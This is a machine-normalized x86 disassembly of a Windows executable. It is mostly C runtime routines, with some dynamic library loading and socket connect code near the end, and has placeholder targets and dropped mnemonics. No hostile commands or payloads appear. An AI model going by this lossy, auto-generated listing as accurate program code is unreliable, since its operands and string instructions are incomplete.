movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_200d842
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp + 0xc ]
mov eax ebx
cdq
mov ecx eax
mov eax [ ebp + 0x8 ]
xor ecx edx
sub ecx edx
and ecx 0xf
xor ecx edx
sub ecx edx
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
mov edx ecx
or edx edi
jne r-xdata
cmp ecx edi
jne r-xdata
mov esi [ ebp + 0x10 ]
mov ecx esi
and ecx 0x7f
mov [ ebp - 0x18 ] ecx
cmp esi ecx
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
neg ecx
add ecx 0x10
mov [ ebp - 0x1c ] ecx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x1c ]
[ edi ] [ esi ]
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x1c ]
mov edx [ ebp + 0xc ]
add edx [ ebp - 0x1c ]
mov eax [ ebp + 0x10 ]
sub eax [ ebp - 0x1c ]
push eax
push edx
push ecx
call sub_200d842
add esp 0xc
mov eax [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
sub esi ecx
push esi
push ebx
push eax
call sub_200d7bb
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
add edx ebx
sub edx ecx
mov [ ebp - 0x14 ] edx
add ebx eax
sub ebx ecx
mov [ ebp - 0x10 ] ebx
mov esi [ ebp - 0x14 ]
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_200d925
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
push 0x1004
push [ ebp + 0x8 ]
mov [ ebp - 0x6 ] 0x0
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_20018e6
pop ecx
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_2002d91
leave
retn
sub_200d96e
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov [ ebp - 0x30 ] eax
mov eax [ eax ]
push esi
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x2c ] edi
cmp eax [ ebp + 0xc ]
je r-xdata
mov eax [ ebp - 0x20 ]
mov esi [ GetCPInfo@IAT ]
lea ecx [ ebp - 0x18 ]
push ecx
push eax
call esi
mov ebx [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push edi
push edi
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
mov esi eax
cmp esi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
mov [ ebp - 0x1c ] edi
cmp esi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x40 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_2002d91
leave
retn
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
lea eax [ esi + esi ]
push eax
push edi
push [ ebp - 0x1c ]
call sub_2007940
add esp 0xc
push esi
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
test eax eax
je r-xdata
lea eax [ esi + esi + 0x8 ]
cmp eax 0x400
ja r-xdata
mov esi [ ebp - 0x24 ]
mov [ ebp - 0x2c ] 0x1
cmp esi 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
call sub_2008535
pop ecx
mov ebx [ ebp - 0x34 ]
cmp ebx edi
je r-xdata
push eax
call sub_200178d
pop ecx
cmp eax edi
je r-xdata
call sub_200db30
mov eax esp
cmp eax edi
je r-xdata
cmp esi edi
push [ ebp - 0x28 ]
call sub_2009070
mov esi eax
pop ecx
inc esi
mov ebx [ WideCharToMultiByte@IAT ]
cmp [ ebp - 0x2c ] edi
jne r-xdata
push edi
push edi
push [ ebp + 0x1c ]
push ebx
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push esi
push 0x1
call sub_200b579
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push edi
push edi
push edi
push edi
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
mov esi eax
cmp esi edi
je r-xdata
mov [ ebp - 0x20 ] ebx
jmp r-xdata
cmp [ ebp - 0x1c ] edi
je r-xdata
add eax 0x8
push edi
push edi
push esi
push eax
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
cmp eax edi
jne r-xdata
cmp [ ebp - 0x24 ] 0xffffffff
je r-xdata
push [ ebp - 0x20 ]
call sub_20016b0
pop ecx
mov [ ebp - 0x20 ] edi
jmp r-xdata
mov ecx [ ebp - 0x30 ]
mov [ ecx ] eax
sub_200db5c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_200144c
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_200898a
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_200dbad
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_200db5c
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
pop ebp
retn
sub_200dbdb
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_200144c
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x80
lea eax [ ebp - 0x10 ]
push eax
push 0x80
push [ ebp + 0x8 ]
call sub_200898a
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_200dc31
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_200dbdb
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x80
pop ebp
retn
sub_200dc61
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_200144c
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
lea eax [ ebp - 0x10 ]
push eax
push 0x8
push [ ebp + 0x8 ]
call sub_200898a
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_200dcb2
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_200dc61
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8
pop ebp
retn
sub_200dce0
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x40
push edi
jne r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffff
je r-xdata
push esi
call sub_200788d
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
mov eax [ esi + 0xc ]
test al 0x1
jne r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
xor edi edi
cmp [ esi + 0x8 ] edi
jne r-xdata
test al al
jns r-xdata
call sub_20047ce
xor edi edi
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_2004766
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov edi eax
sar edi 0x5
shl ecx 0x6
add ecx [ edi * 4 + rw-data ]
jmp r-xdata
mov eax [ esi ]
cmp eax [ esi + 0x8 ]
jne r-xdata
push esi
call sub_200bc76
pop ecx
test al 0x2
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
dec [ esi ]
test [ esi + 0xc ] 0x40
mov eax [ esi ]
je r-xdata
cmp [ esi + 0x4 ] edi
jne r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov [ eax ] bl
cmp [ eax ] bl
je r-xdata
inc eax
mov [ esi ] eax
test [ eax + 0x24 ] 0x80
je r-xdata
pop ebx
mov eax [ esi + 0xc ]
inc [ esi + 0x4 ]
and eax 0xffffffef
or eax 0x1
mov [ esi + 0xc ] eax
mov eax ebx
and eax 0xff
jmp r-xdata
inc eax
mov [ esi ] eax
sub_200ddd1
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_200144c
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_200de3c
push 0x10
push r--data
call sub_200625c
xor eax eax
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp ebx edi
setne al
cmp eax edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_20047ce
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_2004766
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
push [ rw-data ]
call [ HeapSize@IAT ]
mov esi eax
push 0x4
call sub_2005765
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_2005798
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
call sub_20062a1
retn
mov esi [ ebp - 0x1c ]
mov esi [ ebx - 0x4 ]
sub esi 0x9
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov eax esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200ded6
cmp [ ebp - 0x20 ] edi
jne r-xdata
sub_200dee8
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
test [ rw-data ] 0x1
push esi
je r-xdata
call sub_200ae0c
test eax eax
je r-xdata
push 0xa
call sub_200644c
pop ecx
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_200ae19
pop ecx
push 0x3
call sub_200311b
int3
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov esi [ ebp + 0x4 ]
lea eax [ ebp + 0x4 ]
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] esi
mov eax [ eax - 0x4 ]
push 0x50
mov [ ebp - 0x21c ] eax
lea eax [ ebp - 0x328 ]
push 0x0
push eax
call sub_2007940
lea eax [ ebp - 0x328 ]
add esp 0xc
mov [ ebp - 0x2d8 ] eax
lea eax [ ebp - 0x2d0 ]
push 0x0
mov [ ebp - 0x328 ] 0x40000015
mov [ ebp - 0x31c ] esi
mov [ ebp - 0x2d4 ] eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x2d8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
sub_200dfff
push 0xc
push r--data
call sub_200625c
mov ecx [ ebp + 0x8 ]
xor edi edi
cmp ecx edi
jbe r-xdata
imul ecx [ ebp + 0xc ]
mov esi ecx
mov [ ebp + 0x8 ] esi
cmp esi edi
jne r-xdata
push 0xffffffe0
pop eax
xor edx edx
div ecx
cmp eax [ ebp + 0xc ]
sbb eax eax
inc eax
jne r-xdata
xor ebx ebx
mov [ ebp - 0x1c ] ebx
cmp esi 0xffffffe0
ja r-xdata
xor esi esi
inc esi
call sub_20047ce
mov [ eax ] 0xc
push edi
push edi
push edi
push edi
push edi
call sub_2004766
add esp 0x14
cmp ebx edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_20062a1
retn
mov eax ebx
cmp [ rw-data ] edi
je r-xdata
cmp ebx edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
mov eax [ ebp + 0x8 ]
cmp eax [ rw-data ]
ja r-xdata
cmp ebx edi
jne r-xdata
push esi
call sub_200663f
pop ecx
test eax eax
jne r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov ebx eax
push 0x4
call sub_2005765
pop ecx
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call sub_2005f77
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200e0fb
mov ebx [ ebp - 0x1c ]
cmp ebx edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
push [ ebp + 0x8 ]
push edi
push ebx
call sub_2007940
add esp 0xc
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
jmp r-xdata
sub_200e11d
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
cmp ecx ebx
jbe r-xdata
imul ecx [ ebp + 0x10 ]
push esi
push edi
mov esi ecx
cmp [ ebp + 0x8 ] ebx
je r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0x10 ]
jae r-xdata
push esi
push [ ebp + 0x8 ]
call sub_200227f
mov edi eax
pop ecx
pop ecx
test edi edi
je r-xdata
push [ ebp + 0x8 ]
call sub_200de3c
pop ecx
mov ebx eax
call sub_20047ce
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0xc
call sub_2004766
add esp 0x14
xor eax eax
jmp r-xdata
mov eax edi
pop edi
pop esi
cmp ebx esi
jae r-xdata
pop ebx
pop ebp
retn
sub esi ebx
push esi
push 0x0
add ebx edi
push ebx
call sub_2007940
add esp 0xc
sub_200e198
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor ebx ebx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
call sub_200bad8
mov [ ebp - 0x18 ] eax
and eax edx
add esp 0x10
mov [ ebp - 0x14 ] edx
cmp eax 0xffffffff
je r-xdata
call sub_20047ce
mov eax [ eax ]
push 0x2
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_200bad8
mov ecx eax
and ecx edx
add esp 0x10
cmp ecx 0xffffffff
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
sub esi eax
sbb edi edx
js r-xdata
cmp edi ebx
jg r-xdata
jg r-xdata
push ebx
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call sub_200bad8
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
jl r-xdata
mov ebx 0x1000
push ebx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
cmp esi ebx
jbe r-xdata
xor eax eax
jmp r-xdata
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200bad8
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
cmp esi ebx
jae r-xdata
push 0x8000
push [ ebp + 0x8 ]
call sub_200e34e
pop ecx
pop ecx
mov [ ebp - 0x8 ] eax
call sub_20047ce
mov [ eax ] 0xc
pop edi
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
call sub_200d112
pop ecx
push eax
call [ SetEndOfFile@IAT ]
neg eax
sbb eax eax
neg eax
dec eax
cdq
mov [ ebp - 0x10 ] eax
and eax edx
mov [ ebp - 0xc ] edx
cmp eax 0xffffffff
jne r-xdata
mov eax esi
jg r-xdata
call sub_20047ce
mov [ eax ] 0xd
call sub_20047e1
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
mov esi [ ebp - 0x10 ]
call sub_20047e1
cmp [ eax ] 0x5
jne r-xdata
cdq
sub esi eax
sbb edi edx
js r-xdata
mov eax ebx
jmp r-xdata
cmp esi ebx
jb r-xdata
or esi 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
call sub_20047ce
mov [ eax ] 0xd
mov esi [ ebp - 0x10 ]
jg r-xdata
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_20079ba
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_200e34e
pop ecx
pop ecx
push [ ebp - 0x4 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ebx ebx
jmp r-xdata
and esi [ ebp - 0xc ]
cmp esi 0xffffffff
je r-xdata
test edi edi
jl r-xdata
test esi esi
ja r-xdata
sub_200e34e
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov eax esi
sar eax 0x5
lea edx [ eax * 4 + rw-data ]
mov eax [ edx ]
and esi 0x1f
shl esi 0x6
lea ecx [ eax + esi ]
mov al [ ecx + 0x24 ]
add al al
push edi
movzx edi [ ecx + 0x4 ]
movsx eax al
and edi 0x80
sar eax 0x1
cmp ebx 0x4000
je r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
and [ ecx ] 0x80
cmp ebx 0x8000
je r-xdata
neg eax
sbb eax eax
and eax 0xc000
add eax 0x4000
pop ebp
retn
mov eax 0x8000
pop ebp
retn
and [ ecx + 0x4 ] 0x7f
jmp r-xdata
cmp ebx 0x10000
je r-xdata
test edi edi
pop edi
pop esi
pop ebx
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x82
or dl 0x2
jmp r-xdata
cmp ebx 0x20000
je r-xdata
mov [ ecx ] dl
jmp r-xdata
cmp ebx 0x40000
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x81
or dl 0x1
sub_200e40a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_20047ce
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_2004766
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_200e462
mov eax [ rw-data ]
push esi
mov esi [ CloseHandle@IAT ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0xfffffffe
je r-xdata
pop esi
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call esi
push eax
call esi
sub_200e496
push ebp
mov ebp esp
sub esp 0x400
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0x400 ]
push eax
call sub_2002b3a
add esp 0xc
push 0x0
push eax
lea eax [ ebp - 0x400 ]
push eax
push [ ebp + 0x8 ]
call [ rw-data ]
leave
retn
sub_200e4ca
push ebx
push edi
xor edi edi
cmp [ esp + 0xc ] edi
jle r-xdata
mov eax [ esp + 0xc ]
mov [ esi + eax ] 0x0
push 0x0
push 0x1
lea ebx [ edi + esi ]
push ebx
push [ esp + 0x1c ]
call [ rw-data ]
test eax eax
jle r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx ] 0xa
je r-xdata
pop edi
pop ebx
retn
mov [ edi + esi + 0x1 ] 0x0
jmp r-xdata
inc edi
cmp edi [ esp + 0xc ]
jl r-xdata
mov eax esi
sub_200e539
push ebp
mov ebp esp
sub esp 0x18
push esi
push edi
mov edi eax
call sub_200e50e
test eax eax
jge r-xdata
push [ ebp + 0x8 ]
call inet_addr
mov esi eax
mov [ ebp - 0x4 ] esi
cmp esi 0xffffffff
jne r-xdata
xor eax eax
jmp r-xdata
test edi edi
je r-xdata
push [ ebp + 0x8 ]
call gethostbyname
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push 0x6
push 0x1
push 0x2
call [ rw-data ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov [ edi ] esi
movsx ecx [ eax + 0xa ]
mov eax [ eax + 0xc ]
push ecx
push [ eax ]
lea eax [ ebp - 0x4 ]
push eax
call sub_20081d0
mov esi [ ebp - 0x4 ]
add esp 0xc
push 0x2
pop eax
push [ ebp + 0xc ]
mov [ ebp - 0x14 ] ax
mov [ ebp - 0x10 ] esi
call [ htons@IAT ]
mov [ ebp - 0x12 ] ax
push 0x10
lea eax [ ebp - 0x14 ]
push eax
push edi
call [ rw-data ]
inc eax
neg eax
sbb eax eax
and eax edi
sub_200e5cf
push ebp
mov ebp esp
sub esp 0x104
push esi
mov esi [ rw-data ]
test esi esi
jne r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x104 ]
push eax
call sub_2010397
pop ecx
pop ecx
lea eax [ ebp - 0x104 ]
push eax
push esi
call [ GetProcAddress@IAT ]
jmp r-xdata
lea eax [ ebp - 0x104 ]
push r--data
push eax
call sub_2010397
pop ecx
pop ecx
lea eax [ ebp - 0x104 ]
push eax
call [ LoadLibraryA@IAT ]
mov esi eax
mov [ rw-data ] esi
test esi esi
je r-xdata
pop esi
leave
retn
xor eax eax
sub_200e635
push ebp
mov ebp esp
sub esp 0x104
push esi
mov esi [ rw-data ]
test esi esi
jne r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x104 ]
push eax
call sub_2010397
pop ecx
pop ecx
lea eax [ ebp - 0x104 ]
push eax
push esi
call [ GetProcAddress@IAT ]
jmp r-xdata
lea eax [ ebp - 0x104 ]
push r--data
push eax
call sub_2010397
pop ecx
pop ecx
lea eax [ ebp - 0x104 ]
push eax
call [ LoadLibraryA@IAT ]
mov esi eax
mov [ rw-data ] esi
test esi esi
je r-xdata
pop esi
leave
retn
xor eax eax
sub_200e69b
xor eax eax
inc eax
cmp [ rw-data ] eax
jne r-xdata
cmp [ esi + 0x428 ] eax
je r-xdata
push r--data
call sub_200e635
pop ecx
test eax eax
jne r-xdata
xor eax eax
retn
mov ecx [ esi + 0x42c ]
mov [ ebx ] ecx
mov [ edi ] 0x4
retn
push 0x0
push edi
push ebx
push 0x20000005
push esi
call eax
retn
sub_200e6dc
and [ rw-data ] 0x0
push r--data
call sub_200e635
pop ecx
test eax eax
je r-xdata
retn 0x4
mov ecx [ esp + 0x4 ]
push [ ecx + 0xc ]
push [ ecx + 0x8 ]
push [ ecx + 0x4 ]
push [ ecx ]
call eax
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
sub_200e714
and [ rw-data ] 0x0
push r--data
call sub_200e635
pop ecx
test eax eax
je r-xdata
retn 0x4
mov ecx [ esp + 0x4 ]
push [ ecx + 0x10 ]
push [ ecx + 0xc ]
push [ ecx + 0x8 ]
push [ ecx + 0x4 ]
push [ ecx ]
call eax
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
sub_200e74f
and [ rw-data ] 0x0
push r--data
call sub_200e635
pop ecx
test eax eax
je r-xdata
retn 0x4
mov ecx [ esp + 0x4 ]
push [ ecx + 0x10 ]
push [ ecx + 0xc ]
push [ ecx + 0x8 ]
push [ ecx + 0x4 ]
push [ ecx ]
call eax
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
sub_200e78a
push ecx
cmp [ rw-data ] 0x1
push ebx
push esi
jne r-xdata
mov ebx 0x1438
push ebx
call sub_200178d
mov esi eax
pop ecx
test esi esi
je r-xdata
push r--data
call sub_200e635
pop ecx
xor ecx ecx
cmp eax ecx
jne r-xdata
xor eax eax
jmp r-xdata
push ebx
push 0x0
push esi
call sub_2007940
xor ebx ebx
add esp 0xc
mov [ esi ] 0x2
mov [ esi + 0x4 ] edi
cmp [ edi + 0x8 ] ebx
jne r-xdata
push ecx
push 0x4080000
push ecx
push ecx
push ecx
push [ esp + 0x28 ]
push [ esp + 0x28 ]
push edi
call eax
jmp r-xdata
pop esi
pop ebx
pop ecx
retn 0x8
mov eax [ esp + 0x10 ]
lea edx [ esi + 0x8 ]
sub edx eax
push [ edi + 0x10c ]
lea ecx [ edi + 0xc ]
lea eax [ edi + 0x110 ]
push ecx
call sub_200e539
pop ecx
pop ecx
mov [ edi + 0x8 ] eax
cmp eax ebx
jne r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
mov eax [ esp + 0x14 ]
lea edx [ esi + 0x28 ]
sub edx eax
push esi
call sub_20016b0
pop ecx
jmp r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
or [ esi + 0x42c ] 0xffffffff
mov [ esi + 0x1430 ] ebx
mov [ esi + 0x428 ] ebx
mov [ esi + 0x1434 ] ebx
mov eax esi
sub_200e863
cmp [ rw-data ] 0x1
jne r-xdata
test esi esi
je r-xdata
push r--data
call sub_200e635
pop ecx
test eax eax
jne r-xdata
xor eax eax
retn
mov eax [ esi ]
cmp eax 0x1
jne r-xdata
push esi
call eax
retn
cmp eax 0x2
jne r-xdata
push [ esi + 0x8 ]
call [ closesocket@IAT ]
and [ esi + 0x8 ] 0x0
jmp r-xdata
push esi
call sub_20016b0
xor eax eax
pop ecx
inc eax
retn
cmp [ esi + 0x1434 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
push [ eax + 0x8 ]
call [ rw-data ]
mov eax [ esi + 0x4 ]
and [ eax + 0x8 ] 0x0
sub_200e8c8
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x1
push esi
push edi
jne r-xdata
mov edi 0x130
push edi
call sub_200178d
mov esi eax
pop ecx
test esi esi
je r-xdata
push r--data
call sub_200e635
pop ecx
xor ecx ecx
cmp eax ecx
jne r-xdata
xor eax eax
